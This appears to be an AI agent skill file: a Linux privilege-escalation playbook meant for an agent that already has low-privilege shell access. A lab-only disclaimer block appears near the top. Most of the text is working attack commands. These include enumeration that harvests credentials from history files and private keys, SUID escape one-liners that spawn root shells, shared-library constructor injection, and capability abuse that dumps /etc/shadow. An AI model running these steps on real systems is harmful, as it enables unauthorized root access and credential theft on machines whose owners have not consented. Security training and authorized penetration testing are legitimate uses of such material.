---
name: linux-privilege-escalation
description: >-
  Linux privilege escalation playbook. Use when you have low-privilege shell access and need to escalate to root via SUID/SGID binaries, capabilities, cron abuse, kernel exploits, misconfigurations, or credential harvesting on Linux systems.
---

# SKILL: Linux Privilege Escalation — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert Linux privesc techniques. Covers enumeration, SUID/SGID, capabilities, cron abuse, kernel exploits, NFS, writable passwd/shadow, LD_PRELOAD, Docker group, and library hijacking. Pay particular attention to subtle escalation paths via capabilities and combined misconfigurations.

## 0. RELATED ROUTING

Before going deep, consider routing to:

- `container-escape-techniques` when the target is a container and you need to escape to host
- `linux-security-bypass` when facing restricted shells, AppArmor, SELinux, or seccomp
- `linux-lateral-movement` after obtaining root for pivoting to adjacent hosts
- `kubernetes-pentesting` when the host is a Kubernetes node

### Advanced Reference

Also inspect [SUID_CAPABILITIES_TRICKS.md](./SUID_CAPABILITIES_TRICKS.md) when you need:
- Top 30 SUID binaries with exact exploitation commands (GTFOBins)
- Capability-specific exploitation for each dangerous cap
- Custom SUID binary exploitation methodology

Also inspect [KERNEL_EXPLOITS_CHECKLIST.md](./KERNEL_EXPLOITS_CHECKLIST.md) when you need:
- Kernel version → exploit mapping table (DirtyPipe, DirtyCow, OverlayFS, etc.)
- Exploit compilation tips and cross-compilation notes
- Kernel exploit stability assessment

---

## 1. ENUMERATION CHECKLIST

When an explicitly isolated lab supplies shell-enumeration output, inspect these artifact classes. The current runtime does not obtain or control a shell; the commands below are reference syntax only:

### System Info

```bash
uname -a                        # Kernel version
cat /etc/os-release             # Distro and version
cat /proc/version               # Kernel compile info
hostname && id && whoami        # Current context
```

### Sudo & SUID/SGID

```bash
sudo -l                         # What can we run as root?
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
find / -perm -2000 -type f 2>/dev/null   # SGID binaries
getcap -r / 2>/dev/null         # Files with capabilities
```

### Cron & Timers

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
systemctl list-timers --all     # systemd timers
```

### Writable Files & Dirs

```bash
find / -writable -type f 2>/dev/null | grep -v proc
ls -la /etc/passwd /etc/shadow  # Check permissions
find / -perm -o+w -type d 2>/dev/null   # World-writable dirs
```

### Network & Services

```bash
ss -tlnp                        # Listening services
cat /proc/net/tcp               # Raw TCP connections
ps aux                          # Running processes
env                             # Environment variables (credentials?)
```

### Credential Locations

```bash
cat ~/.bash_history
cat ~/.mysql_history
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | head -30
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null
```

---

## 2. SUID/SGID EXPLOITATION

### GTFOBins Methodology

1. Find SUID binaries: `find / -perm -4000 -type f 2>/dev/null`
2. Cross-reference each with [GTFOBins](https://gtfobins.github.io/)
3. Use the "SUID" section specifically — not all binary abuse works with SUID

### Quick-Win SUID Escalations

| Binary | Command |
|---|---|
| `bash` | `bash -p` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `vim` | `vim -c ':!/bin/sh'` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `env` | `env /bin/sh -p` |
| `nmap` (old) | `nmap --interactive` → `!sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh -p")}'` |
| `less` | `less /etc/passwd` → `!/bin/sh` |
| `cp` | Copy `/etc/passwd`, add root user, copy back |

### Shared Library Hijacking (SUID Binary)

```bash
ldd /usr/local/bin/suid_binary                    # Check loaded libraries
strace /usr/local/bin/suid_binary 2>&1 | grep -i "open.*\.so"  # Find load paths

# If it loads from a writable directory — inject constructor:
gcc -shared -fPIC -o /writable/path/libevil.so evil.c
# evil.c: __attribute__((constructor)) → setuid(0); system("/bin/bash -p")
```

---

## 3. CAPABILITIES ABUSE

| Capability | Risk | Exploitation |
|---|---|---|
| `cap_setuid` | **Critical** | `python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'` |
| `cap_dac_override` | **Critical** | Read/write any file regardless of permissions |
| `cap_dac_read_search` | **High** | Read any file — dump `/etc/shadow` |
| `cap_sys_admin` | **Critical** | Mount filesystems, BPF, namespace manipulation |
| `cap_sys_ptrace` | **High** | Inject into root processes via ptrace |
| `cap_net_raw` | **Medium** | Sniff traffic, ARP spoofing |
| `cap_net_bind_service` | **Low** | Bind to privileged ports (<1024) |
| `cap_fowner` | **High** | Change ownership of any file |

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Example: python3 with cap_setuid
# /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 4. CRON / TIMER ABUSE
- 5. NFS NO_ROOT_SQUASH
- 6. WRITABLE /etc/passwd OR /etc/shadow
- 7. LD_PRELOAD / LD_LIBRARY_PATH WITH SUDO
- 8. DOCKER GROUP → ROOT
- 9. PYTHON / PERL / RUBY LIBRARY HIJACKING
- 10. AUTOMATED TOOLS
- 11. PRIVILEGE ESCALATION DECISION TREE
